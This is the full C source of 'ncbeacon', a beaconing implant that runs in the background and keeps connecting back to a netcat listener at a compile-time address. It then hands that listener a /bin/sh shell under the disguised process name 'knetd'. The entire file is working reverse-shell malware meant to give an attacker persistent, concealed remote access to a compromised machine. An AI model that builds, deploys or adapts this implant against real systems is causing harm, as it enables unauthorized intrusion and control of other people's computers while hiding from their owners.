/*
 * ncbeacon.c
 * Beaconing implant which tries to connect to a netcat listener
 * By J. Stuart McMurray
 * Created 20201009
 * Last Modified 20201009
 */

#include <sys/socket.h>

#include <arpa/inet.h>
#include <netinet/in.h>

#include <err.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Configurable things */
#ifndef CBWAIT
#define CBWAIT 5           /* Callback interval */
#endif
#ifndef SHNAME
#define SHNAME "knetd"     /* Shell process name */
#endif
#ifndef CBPORT
#define CBPORT 4444
#endif

#define str(s) #s
#define xstr(s) str(s)
#ifndef CBADDR
#error Please define a callback address with -DCBADDR=
#endif /* #ifndef CBADDR */

/* callback tries to make a callback and turn it into a shell */
void
callback(struct sockaddr_in *sa)
{
        pid_t fret;
        int i, s;

        /* Double-fork a child */
        switch (fret = fork()) {
                case 0: /* Intermediate child */
                        break;
                case -1: /* Error */
                        warn("first fork");
                default: /* Parent */
                        return;
        }
        if (-1 == setsid())
                warn("setsid");
        switch (fret = fork()) {
                case 0: /* Child */
                        break;
                case -1: /* Error */
                        err(5, "second fork");
                default: /* Parent */
                        exit(0);
        }

        /* Connect back */
        if (-1 == (s = socket(AF_INET, SOCK_STREAM, 0)))
                err(6, "socket");
        if (-1 == connect(s, (struct sockaddr *)sa,
                                sizeof(struct sockaddr_in)))
                err(7, "connect");

        /* Connect stdio to the socket */
        for (i = 0; i < 3; ++i)
                if (-1 == dup2(s, i))
                        warn("dup2 (%d)", i);
        if (-1 == close(s))
                warn("close");

        /* Tell the user hello */
        if (0 > printf("Connected, pid %d, uid %d\nStarting shell\n", getpid(),
                                getuid()))
                err(8, "printf");
        if (0 != fflush(stdout))
                err(9, "fflush");

        /* Turn into a shell */
        if (-1 == execl("/bin/sh", SHNAME, (char *)NULL))
                err(3, "execl");

        /* Unpossible */
        exit(8);
}


int
main(void)
{
        struct sockaddr_in sa;
        int ts;

        /* Socket address */
        memset(&sa, 0, sizeof(sa));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(CBPORT);
        if (INADDR_NONE == (sa.sin_addr.s_addr = inet_addr(xstr(CBADDR))))
                errx(1, "malformed callback addresss");

        /* Fork into the background */
        if (SIG_ERR == signal(SIGCHLD, SIG_IGN))
                err(2, "signal");
#ifndef DEBUG
        if (-1 == daemon(1, 0))
                err(3, "daemon");
#endif
        

        /* Try to make a callback every so often */
        for (;;) {
                /* Fire off a child to call back */
                callback(&sa);

                /* Sleep a bit before the next attempt */
                ts = CBWAIT;
                while (0 < ts)
                        ts = sleep(ts);
        }

        return -1;
}
